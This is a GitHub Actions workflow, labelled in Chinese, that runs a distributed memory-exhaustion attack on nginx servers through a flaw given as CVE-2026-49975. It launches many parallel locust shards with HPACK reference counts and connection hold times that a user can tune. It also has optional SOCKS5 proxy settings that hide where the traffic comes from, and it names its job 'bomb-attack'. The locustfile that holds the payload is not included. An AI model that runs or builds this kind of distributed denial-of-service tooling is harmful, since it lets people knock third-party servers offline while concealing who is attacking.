name: CVE-2026-49975 分布式内存消耗测试（支持代理）

on:
  workflow_dispatch:
    inputs:
      target_url:
        description: '1. 目标 URL'
        required: true
        default: 'https://your-nginx-server.com'
      threads_per_shard:
        description: '2. 每个分片的并发线程数'
        required: true
        default: '100'
      shard_count:
        description: '3. 分片数量'
        required: true
        default: '15'
      run_time_minutes:
        description: '4. 测试时长（分钟）'
        required: true
        default: '5'
      hpack_references:
        description: '5. HPACK 引用次数（1024~4096）'
        required: false
        default: '2048'
      hold_seconds:
        description: '6. 连接保持秒数（10~30）'
        required: false
        default: '15'
      # ===== 新增：代理配置 =====
      proxy_url:
        description: '7. 代理 URL（留空则直连，支持 socks5:// http:// https://）'
        required: false
        default: ''
      socks5_user:
        description: '8. SOCKS5 用户名（留空则无认证）'
        required: false
        default: ''
      socks5_pass:
        description: '9. SOCKS5 密码'
        required: false
        default: ''

jobs:
  generate-matrix:
    runs-on: ubuntu-latest
    outputs:
      matrix_array: ${{ steps.set-matrix.outputs.matrix_array }}
    steps:
      - id: set-matrix
        run: |
          SHARD_COUNT=${{ github.event.inputs.shard_count }}
          JSON_ARRAY=$(python3 -c "import json; print(json.dumps(list(range(1, $SHARD_COUNT + 1))))")
          echo "matrix_array=$JSON_ARRAY" >> $GITHUB_OUTPUT

  bomb-attack:
    needs: generate-matrix
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        shard: ${{ fromJson(needs.generate-matrix.outputs.matrix_array) }}

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Install Dependencies
        run: |
          pip install locust==2.32.2
          pip install PySocks  # SOCKS 代理支持

      - name: 💣 CVE-2026-49975 Bomb Test - Shard ${{ matrix.shard }}
        run: |
          locust -f locustfile.py \
            --headless \
            -u ${{ github.event.inputs.threads_per_shard }} \
            -r ${{ github.event.inputs.threads_per_shard }} \
            --run-time ${{ github.event.inputs.run_time_minutes }}m \
            --host ${{ github.event.inputs.target_url }}
        env:
          LOCUST_REFERENCES: ${{ github.event.inputs.hpack_references }}
          LOCUST_HOLD_SECONDS: ${{ github.event.inputs.hold_seconds }}
          # 代理配置（留空则直连）
          SOCKS5_PROXY: ${{ github.event.inputs.proxy_url }}
          SOCKS5_USER: ${{ github.event.inputs.socks5_user }}
          SOCKS5_PASS: ${{ github.event.inputs.socks5_pass }}

      - name: ✅ Shard ${{ matrix.shard }} 完成
        run: echo "Shard ${{ matrix.shard }} 炸弹攻击完成"